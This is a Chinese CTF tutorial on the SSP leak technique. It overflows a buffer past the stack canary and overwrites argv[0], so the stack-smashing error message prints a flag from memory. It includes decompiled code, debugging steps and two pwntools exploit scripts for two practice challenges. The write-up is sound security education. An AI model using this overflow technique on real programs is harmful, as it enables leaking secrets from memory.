## 前言

这几天刷栈溢出的题目碰到了一个没怎么见过的题型，感觉网上也没有太多讲解的内容，结合例题进行讲解一下什么是SSP leak。

## 原理

SSP(Stack Smashing Protect) Leak —— 故意触发栈溢出保护泄露攻击
是通过故意触发canary保护并修改要输出变量（argv[0]）的地址来实现任意地址读取的一种攻击。这种攻击方式因为不能get
shell因此用的比较少,但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可以使用一个栈溢出漏洞来把它们泄露出来。

可以用下图解释。

![](./img/2821146680042370937.png)

其实这种攻击方式的原理很简单，当canary被检测到修改时，函数不会经过正常的流程结束栈帧并继续执行接下来的代码，而是跳转到call
__stack_chk_fail处，然后对于我们来说，执行完这个函数，程序退出，会像下图一样提示

    
    
    *** stack smashing detected ***:./pwn terminated

![](./img/7538030679508508726.png)

所以说，我们是不是可以通过栈溢出的手法，将这个显示文件名字的地方替换为我们需要读取的地址呢，从而达成任意地址读取，达到泄露地址或者获取flag的途径。

这里顺便附上__stack_chk_fail函数的源代码便于更好理解。

    
    
    void __attribute__ ((noreturn)) __stack_chk_fail (void)
    {
      __fortify_fail ("stack smashing detected");
    }
    void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
    {
      /* The loop is added only to keep gcc happy.  */
      while (1)
        __libc_message (2, "*** %s ***: %s terminated\n",
                        msg, __libc_argv[0] ?: "<unknown>");
    }
    

## 漏洞利用

我们可以测试一下如果触发栈溢出的情况，拿两道实例题目进行测试

### smashes

![](./img/3581738370471892647.png)

可以看到开启了canary保护，64位程序

直接测试一下，输入过长的数据

![](./img/5137933681977951200.png)

可以发现确实和我们所说的原理一样，argv[0]指针默认指向程序名

IDA静态分析一下

![](./img/7159456859983105028.png)

可以发现没有main函数，应该是程序也开启了去string，所以我们需要自己找main函数

跟进看一下调用的sub_4007E0()

    
    
    void sub_4007E0()
    {
      __int64 v0; // rbx
      int v1; // eax
      char v2[264]; // [rsp+0h] [rbp-128h] BYREF
      unsigned __int64 v3; // [rsp+108h] [rbp-20h]
    
      v3 = __readfsqword(0x28u);//这是开启canary的一个标志
      __printf_chk(1LL, "Hello!\nWhat's your name? ");
      if ( !_IO_gets(v2) )
    LABEL_10:
        _exit(1);
      v0 = 0LL;
      __printf_chk(1LL, "Nice to meet you, %s.\nPlease overwrite the flag: ", v2);
      while ( 1 )
      {
        v1 = _IO_getc(stdin);
        if ( v1 == -1 )
          goto LABEL_10; //如果什么都不输入调转到LABEL_10
        if ( v1 == 10 )
          break;//如果输入换行符，break
        byte_600D20[v0++] = v1;
        if ( v0 == 32 )
          goto LABEL_8;//输入空格，也就是输入内容，跳转到LABEL_8
      }
      memset((void *)((int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));
    LABEL_8:
      puts("Thank you, bye!");
      if ( __readfsqword(0x28u) != v3 )//检查canary的值是否发生变化
        init();
    }
    

其实用汇编语言解释一下canary就是这一段

![](./img/3094953472693879850.png)

jnz：我的理解是jump if not zero,not equal.

就是经过异或，如果不为0就会执行后面的loc_4008A9，然后loc_4008A9函数call了一个___stack_chk_fail

这里shift+F12看一下有没有什么可以利用的字符串

![](./img/688297839907144463.png)

发现了这里提示我们flag在这里的server端，所以进行gdb调试

这里也发现了无法直接断在main函数，因为没有main函数，而且我们断在了main函数的地址也发现无法进行调试

所以我们曲线救国，断在gets()之后，马上就要输入字符的地方

![](./img/8554111803214290266.png)

run起来，搜一下找一下服务端的flag地址在哪

![](./img/2933934815055529863.png)

现在也就知道了flag的地址了，看一下需要栈溢出的字节

![](./img/1304103586563621289.png)

图中画框的地方就是我们需要利用的地方，这里默认是指向程序名字的地址，所以说我们栈溢出覆盖了caller's ebp之后，将ret
address指向flag的服务端的地址，就可以在程序因为canary保护崩溃的之后打印出flag

这里我用的是Ubantu16打的本地，20的libc版本太高了，应该是修复了这个漏洞

![](./img/4110794807351350245.png)

exp:

    
    
    from pwn import *
    context(os='linux',arch='amd64',log_level='debug')
    io=process('./pwn')
    elf=ELF('./pwn')
    flag=0x400d20
    
    payload=cyclic(536)+p64(flag)
    io.sendline(payload)
    io.interactive()
    

### [HNCTF 2022 WEEK3]smash

题目给出了libc版本了，libc2.23->对于的是Ubantu16的，用Ubantu16分析

checksec一下

![](./img/2314338958533829244.png)

开启了canary，64位的，应该和上一题差不多，这里先找一下栈溢出的字节

![](./img/1031005613320309458.png)

这里也可以利用另一种方式查看argv[0]指针指向地址

    
    
    print &__libc_argv[0]

![](./img/7779118837251716792.png)

发现也是存在SSP leak，现在就是要找flag服务端的位置了

IDA静态分析一下

main

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int fd; // [rsp+Ch] [rbp-114h]
      char v5[264]; // [rsp+10h] [rbp-110h] BYREF
      unsigned __int64 v6; // [rsp+118h] [rbp-8h]
    
      v6 = __readfsqword(0x28u);
      setbuf(stdin, 0LL);
      setbuf(stderr, 0LL);
      setbuf(stdout, 0LL);
      fd = open("flag", 0);
      if ( !fd )
      {
        puts("Open Err0r.");
        exit(-1);
      }
      read(fd, &buf, 0x100uLL);
      puts("Good Luck.");
      gets(v5);
      return 0;
    }
    

分析一下，这里找到可以进行栈溢出的gets()函数，所以说我们需要通过栈溢出用垃圾字节覆盖到__libc_argv[0]

我们分析main函数可以得到，fd可以直接读取flag，利用read()函数，将fd中的内容写入到buf的地址，所以说，我们将__libc_argv[0]指针覆盖为buf的地址即可远程得到flag

exp:

    
    
    from pwn import *
    context(os='linux',arch='amd64',log_level='debug')
    #io =process('./pwn')
    io=remote("node1.anna.nssctf.cn",28621)
    elf=ELF('./pwn')
    flag=0x404060 #buf
    
    io.recvuntil(b'Good Luck.')
    payload=cyclic(504)+p64(flag)
    io.sendline(payload)
    io.interactive()
    

## 总结

通过对于SSP
leak的学习，发现了其实这种题型很少见，更多的是在别的打法的利用途中，可以通过这种方式进行泄露地址的，还是要多学习啊，还是太年轻了，又积累了一种骚操作。

